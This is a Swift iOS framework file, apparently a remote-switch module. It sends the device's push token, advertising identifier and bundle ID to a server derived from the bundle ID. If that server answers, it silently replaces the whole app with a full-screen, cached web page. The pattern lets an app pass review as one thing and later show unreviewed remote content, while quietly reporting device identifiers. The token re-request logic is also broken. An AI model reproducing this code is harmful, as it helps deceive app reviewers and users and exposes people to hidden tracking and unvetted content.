import SwiftUI
import UserNotifications
import AppTrackingTransparency
import AdSupport
import Security
import ObjectiveC

// Объявляем AppDelegate внутри фреймворка для перехвата системных событий
class WWWFrameAppDelegate: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate {
    static let shared = WWWFrameAppDelegate()
    
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        print("WWWFrame: APNS token received from system: \(tokenString)")
        
        // Передаем токен в менеджер
        FrameworkManager.shared.setAPNSToken(deviceToken)
    }
    
    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("WWWFrame: Failed to register for remote notifications: \(error.localizedDescription)")
    }
    
    // Для обработки нотификаций в foreground
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.banner, .sound, .badge])
    }
}

class FrameworkManager {
    static let shared = FrameworkManager()
    
    private var apnsToken: String?
    private var attToken: String?
    private var bundleId: String?
    private var webURL: URL?
    private var hasCompletedInitialRequest: Bool = false
    
    private let tokenWaitTime: TimeInterval = 10.0
    
    private init() {}
    
    func launch() {
        print("WWWFrame: Launch initiated")
        
        // Останавливаем все внутренние процессы
        print("WWWFrame: Stopping internal processes")
        
        // Инициализируем автоматическое получение APNS токена
        initializeProxySystem()
        
        // Запрашиваем разрешения на пуш-уведомления
        requestPushNotificationPermission()
        
        // Запрашиваем разрешения на трекинг
        if #available(iOS 14.5, *) {
            requestTrackingPermission()
        } else {
            attToken = "stub_att"
        }
        
        // Получаем bundle ID
        bundleId = getBundleId()
        
        // Проверяем, есть ли сохраненный URL
        if let cachedURL = UserDefaults.standard.string(forKey: "WWWFrame_CachedURL") {
            print("WWWFrame: Found cached URL: \(cachedURL)")
            showWebView(with: URL(string: cachedURL)!)
            return
        }
        
        // Ждем сбора данных и делаем запрос к серверу
        DispatchQueue.main.asyncAfter(deadline: .now() + tokenWaitTime) { [weak self] in
            self?.makeServerRequest()
        }
    }
    
    // Инициализация системы перехвата APNS токена
    private func initializeProxySystem() {
        // Инициализируем прокси для автоматического получения APNS токена
        FrameworkAppDelegateProxy.shared.initialize()
        print("WWWFrame: Proxy system for APNS token initialized")
        
        // Пытаемся получить сохраненный токен из Keychain
        if let tokenData = FrameworkManager.getPushTokenFromKeychain() {
            self.setAPNSToken(tokenData)
            print("WWWFrame: Restored APNS token from Keychain")
        }
    }
    
    private func requestPushNotificationPermission() {
        print("WWWFrame: Requesting push notification permission")
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, error in
            if granted {
                print("WWWFrame: Push notification permission granted")
                DispatchQueue.main.async {
                    // Регистрируем устройство для получения токена
                    UIApplication.shared.registerForRemoteNotifications()
                    
                    // На случай, если токен уже был получен ранее
                    if let tokenData = FrameworkManager.getPushTokenFromKeychain() {
                        self?.setAPNSToken(tokenData)
                    } else {
                        // Временно используем заглушку, позже токен должен прийти
                        self?.apnsToken = "stub_apns_waiting"
                    }
                }
            } else {
                print("WWWFrame: Push notification permission denied")
                DispatchQueue.main.async {
                    self?.apnsToken = "stub_apns"
                }
            }
        }
    }
    
    private func requestTrackingPermission() {
        print("WWWFrame: Requesting tracking permission")
        
        if #available(iOS 14.5, *) {
            ATTrackingManager.requestTrackingAuthorization { [weak self] status in
                switch status {
                case .authorized:
                    DispatchQueue.main.async {
                        self?.attToken = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                    }
                default:
                    print("WWWFrame: Tracking permission not granted")
                    DispatchQueue.main.async {
                        self?.attToken = "stub_att"
                    }
                }
            }
        }
    }
    
    private func getBundleId() -> String {
        if let bundleId = Bundle.main.bundleIdentifier {
            print("WWWFrame: Bundle ID retrieved: \(bundleId)")
            return bundleId
        } else {
            print("WWWFrame: Failed to retrieve bundle ID, using stub")
            return "stub_bundle"
        }
    }
    
    private func generateDomain() -> String {
        let rawBundleId = bundleId ?? "stub_bundle"
        let domain = rawBundleId.replacingOccurrences(of: ".", with: "") + ".top"
        print("WWWFrame: Generated domain: \(domain)")
        return domain
    }
    
    private func createRequestURL() -> URL {
        let domain = generateDomain()
        let finalApnsToken = apnsToken ?? "stub_apns"
        let finalAttToken = attToken ?? "stub_att"
        let finalBundleId = bundleId ?? "stub_bundle"
        
        // Create the parameter string
        let paramString = "apns_token=\(finalApnsToken)&att_token=\(finalAttToken)&bundle_id=\(finalBundleId)"
        print("WWWFrame: Parameter string: \(paramString)")
        
        // Encode to Base64
        guard let data = paramString.data(using: .utf8) else {
            print("WWWFrame: Failed to encode parameter string")
            return URL(string: "https://\(domain)/indexn.php?data=")!
        }
        
        let base64String = data.base64EncodedString()
        
        // Create the URL
        let urlString = "https://\(domain)/indexn.php?data=\(base64String)"
        print("WWWFrame: Generated URL: \(urlString)")
        
        return URL(string: urlString)!
    }
    
    private func makeServerRequest() {
        let url = createRequestURL()
        print("WWWFrame: Making server request to: \(url)")
        hasCompletedInitialRequest = true
        
        URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    print("WWWFrame: Request failed with error: \(error.localizedDescription)")
                    self?.resumeAppOperations()
                    return
                }
                
                guard let data = data, let responseString = String(data: data, encoding: .utf8) else {
                    print("WWWFrame: Invalid response data")
                    self?.resumeAppOperations()
                    return
                }
                
                print("WWWFrame: Server response: \(responseString)")
                
                if !responseString.isEmpty {
                    // Non-empty string means we should show WebView
                    let urlString = "https://\(responseString)"
                    if let url = URL(string: urlString) {
                        print("WWWFrame: Valid URL received: \(urlString)")
                        
                        // Cache the URL for future use
                        UserDefaults.standard.set(urlString, forKey: "WWWFrame_CachedURL")
                        
                        self?.showWebView(with: url)
                    } else {
                        print("WWWFrame: Invalid URL format received")
                        self?.resumeAppOperations()
                    }
                } else {
                    print("WWWFrame: Empty response, resuming app operations")
                    self?.resumeAppOperations()
                }
            }
        }.resume()
    }
    
    private func showWebView(with url: URL) {
        print("WWWFrame: Showing WebView with URL: \(url)")
        webURL = url
        
        let webViewControllerWrapper = WebViewControllerWrapper(url: url)
        
        if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
           let window = windowScene.windows.first {
            // Глобальный черный фон для всех представлений
            window.backgroundColor = .black
            
            let rootView = WebViewContainer(webViewControllerWrapper: webViewControllerWrapper)
                .background(Color.black)
                .statusBar(hidden: true)
            
            // Используем наш кастомный контроллер для фиксированных отступов
            let hostingController = WebViewHostingController(rootView: rootView)
            hostingController.view.backgroundColor = .black
            hostingController.modalPresentationCapturesStatusBarAppearance = true
            
            // Устанавливаем hostingController как rootViewController
            window.rootViewController = hostingController
        }
    }
    
    private func resumeAppOperations() {
        print("WWWFrame: Resuming app operations")
        // This is a placeholder for app-specific logic to resume normal operations
    }
    
    // Called by the application delegate when receiving an APNS token
    func setAPNSToken(_ token: Data) {
        let tokenString = token.map { String(format: "%02.2hhx", $0) }.joined()
        
        // Проверяем, не является ли это тем же самым токеном, что у нас уже есть
        if apnsToken == tokenString {
            print("WWWFrame: Same APNS token received again, ignoring to prevent loops")
            return
        }
        
        print("WWWFrame: APNS token set: \(tokenString)")
        
        // Сохраняем токен
        FrameworkManager.savePushTokenToKeychain(token)
        
        // Обновляем токен
        apnsToken = tokenString
        
        // Проверяем, был ли уже сделан запрос с временным токеном
        if hasCompletedInitialRequest && (apnsToken == "stub_apns_waiting" || apnsToken == "stub_apns") {
            print("WWWFrame: Received real APNS token after initial request, making new request with actual token")
            
            // Создаем новый запрос с настоящим токеном
            DispatchQueue.main.async { [weak self] in
                self?.makeServerRequest()
            }
        }
    }
    
    // Методы для сохранения и получения токена из Keychain
    private static func savePushTokenToKeychain(_ tokenData: Data) {
        print("WWWFrame: Attempting to save APNS token to keychain, token size: \(tokenData.count) bytes")
        
        // Проверяем, валиден ли токен (должен быть определенного размера)
        guard tokenData.count > 0 else {
            print("WWWFrame: Invalid APNS token (empty data), not saving to keychain")
            return
        }
        
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: "APNSTokenKey",
            kSecValueData: tokenData
        ]
        
        // Удаляем существующий токен, если есть
        let deleteStatus = SecItemDelete(query as CFDictionary)
        if deleteStatus != errSecSuccess && deleteStatus != errSecItemNotFound {
            print("WWWFrame: Warning - failed to delete existing APNS token from keychain with error: \(deleteStatus)")
        }
        
        // Сохраняем новый токен
        let status = SecItemAdd(query as CFDictionary, nil)
        if status != errSecSuccess {
            print("WWWFrame: Failed to save APNS token to keychain with error: \(status)")
        } else {
            print("WWWFrame: Successfully saved APNS token to keychain")
        }
    }
    
    private static func getPushTokenFromKeychain() -> Data? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: "APNSTokenKey",
            kSecReturnData: true,
            kSecMatchLimit: kSecMatchLimitOne
        ]
        
        var item: CFTypeRef?
        let status = SecItemCopyMatching(query as CFDictionary, &item)
        
        if status == errSecSuccess, let tokenData = item as? Data {
            return tokenData
        } else if status != errSecItemNotFound {
            print("WWWFrame: Error retrieving token from keychain: \(status)")
        }
        
        return nil
    }
} 